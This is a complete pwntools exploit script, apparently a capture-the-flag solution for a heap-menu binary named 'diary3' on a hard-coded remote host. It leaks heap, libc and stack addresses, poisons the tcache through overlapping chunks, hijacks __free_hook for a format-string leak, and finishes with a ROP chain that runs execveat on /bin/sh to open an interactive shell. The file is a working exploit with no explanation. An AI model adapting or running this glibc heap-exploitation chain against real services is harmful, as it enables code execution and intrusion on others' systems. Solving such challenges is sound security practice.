from pwn import * 
from string import ascii_uppercase

context.arch="x86_64"

def expand_size(size)->int:

    temp = (size + 0x08 + 0x0f)
    if temp < 0x20:
        return 0x20
    else:
        return (temp & ~0x0f)

def allocate_size(p, size)->int:

    p.sendlineafter("> ", "1")
    p.sendlineafter("size: ", str(size))
    p.sendlineafter("data: ", '\x01')
    return expand_size(size)

def delete(p, index):
    p.sendlineafter("> ", "3")
    p.sendlineafter("index: ", str(index))

def dump(p, index):
    p.sendlineafter("> ", "4")
    p.sendlineafter("index: ", str(index))

def allocate(p, size, data)->int:
    p.sendlineafter("> ", "1")
    p.sendlineafter("size: ", str(size))
    p.sendlineafter("data: ", data)
    return expand_size(size)
        
def edit(p, index, data):
    p.sendlineafter('> ', str(2))
    p.sendlineafter('index: ', str(index))
    p.sendlineafter('data: ', data)

def clear(s, index, offset, length=7):
    for j in range(offset + length, offset - 1, -1):
        edit(s, index, 'W' * j)
        
def write(s, index, offset, data, length=7):
    clear(s, index, offset, length)
    edit(s, index, (b'W' * offset) + data.rstrip(b'\x00'))
def main():

    global p 
    HOST, PORT = "167.172.62.193", 31690
    
    if args.REMOTE:
        p = remote(HOST, PORT)
        
    elif args.LOCAL:
        p = process("./diary3")
        
    libc = ELF("./libc.so.6") 
    elf = ELF("./diary3")
    
    a = allocate_size(p, 0xf8) #index = 0
    b = allocate_size(p, 0x68) #index = 1
    c = allocate_size(p, 0x38) #index = 2
    d = allocate_size(p, 0x18) #index = 3
    e = allocate_size(p, 0xf8) #index = 4
    delete(p, 0) #delete chunk a 
    delete(p, 4) #delete chunk b 
    
    e = allocate(p, 0xf8, b'') #index 0
    dump(p, 0)
    p.recvline()
    p.recvline()
    heap_leak = p.recvline().rstrip()
    heap_leak = b'\x0a' + heap_leak 
    heap_leak = u64(heap_leak.ljust(8, b'\x00'))
    heap_leak = heap_leak - 0x10
    log.info(f"heap leak: {hex(heap_leak)}")
    heap_base = heap_leak - 0x160a
    tcache_struct = heap_base + 0x10
    log.info(f"Heap base: {hex(heap_base)}")
    
    #leaking libc address
    delete(p, 0)
    delete(p, 3)
    delete(p, 2)
    delete(p, 1)
    for i in range(9):
        allocate(p, 0x80, b"M")
    for i in range(7):
        delete(p, i)
        
    delete(p, 7)
    allocate(p, 0x10, b"")
    delete(p, 0)
    allocate(p, 0x20, b"")
    dump(p,0)
    p.recvline()
    p.recvline()
    libc_leak = p.recvline().rstrip()
    libc_leak = b'\x90' + libc_leak
    libc_leak = u64(libc_leak.ljust(8, b'\x00'))
    log.info(f"libc leak: {hex(libc_leak)}")
    libc_base = libc_leak - 0x1bfd90
    log.info(f"libc base: {hex(libc_base)}")
    free_hook = libc_base + 0x1c25a8
    log.info(f"free hook: {hex(free_hook)}")
    printf = libc_base + 0x3d830
    log.info(f"printf: {hex(printf)}")
    delete(p, 8)
    delete(p, 0)
    #overlapping chunks to do tcache poisonning 
    fake_offset = 0x1680 #offset to chunk A
    fake_size = (a - 0x10) + b + c + d 
    
    buff = b""
    buff += p64(0)
    buff += p64(fake_size)
    buff += p64(heap_base + fake_offset)
    buff += p64(heap_base + fake_offset)
    buff += b"A" * (0xf8 - len(buff) - 8) #the fake_offset points here
    buff += p64(0)
    
    allocate(p, 0xf8, b"E" * 0xf8) #index = 0
    allocate(p, 0x18, b"D" * 0x18) #index = 1
    allocate(p, 0x38, b"C" * 0x38) #index = 2
    allocate(p, 0x68, b"B" * 0x68) #index = 3
    allocate(p, len(buff), buff)
    
    #filling tcache bins of size 0x100
    for i in range(7):
        allocate(p, 0xf8, b"T")
        
    start_index = 5
    for i in range(start_index, start_index + 7):
        delete(p, i)
        
    delete(p, 3)
    delete(p, 2)
    offset = 0x18 - 0x8 
    length = 8
    for j in range(offset + length, offset - 1, -1):
        edit(p, 1, ascii_uppercase[j] * j)
    
    buff = b""
    buff += b"Z" * (offset)
    buff += p64(fake_size).rstrip(b'\x00')
    edit(p, 1, buff)
    delete(p, 0)
    
    fake_size_f = fake_size - 0x10 - d #0x10 for alignment 
    buff = b"A" * (28 * 8) #I did manual calculations while debugging in gdb-gef
    buff += p64(0)
    buff += p64(0x71)
    buff += p64(tcache_struct)
    buff += p64(0)
    buff += b"B" * (11 * 8) 
    buff += p64(0x41)
    buff += p64(free_hook)
    buff += p64(tcache_struct)
    f = allocate(p, fake_size_f, buff)
    allocate(p, 0x38, "%10$p") #index 2
    allocate(p, 0x38, p64(printf))
    delete(p, 2)
    stack_leak = p.recvuntil(b'\n', drop=True)
    stack_leak = int(stack_leak, 16)
    target_addr = stack_leak - 0x38
    log.info(f"stack leak: {hex(stack_leak)}")
    log.info(f"target: {hex(target_addr)}")
    edit(p, 4, b'/bin/sh\x00') #index 4
    bin_sh = heap_base + 0x1680
    log.info(f"/bin/sh : {hex(bin_sh)}")
    
    write(p, 0, f-c-b, p64(target_addr))
    write(p, 0, f-c-b-0x8, p64(b))
    libc.address = libc_leak - 0x1e4d90
    rop = ROP(libc)
    pop_rsi_rdx = rop.find_gadget(["pop rdx", "pop rsi", "ret"]).address
    xor_edi_syscall = libc.address + 0x0000000000112dec
    mov_rax_rsi = libc.address + 0x000000000005c2aa
    pop_r8 = libc.address + 0x000000000014cb21
    pop_r10 = libc.address + 0x000000000012bda5
    pop_rax = libc.address + 0x0000000000047cf8
    log.info(f"mov rax: {hex(mov_rax_rsi)}")
    ropchain = b""
    ropchain += p64(pop_rsi_rdx)
    ropchain += p64(0)
    ropchain += p64(bin_sh)
    ropchain += p64(mov_rax_rsi)
    ropchain += p64(pop_r8)
    ropchain += p64(0)
    ropchain += p64(0)
    ropchain += p64(0)
    ropchain += p64(pop_r10)
    ropchain += p64(0)
    ropchain += p64(pop_rax)
    ropchain += p64(0x142)
    ropchain += p64(xor_edi_syscall)
    ropchain += b'G' * (0x68 - len(ropchain))
    
    allocate_size(p, 0x68)
    allocate(p, 0x68, ropchain)
    #gdb.attach(p)
    p.interactive()
if __name__ == "__main__":

    main()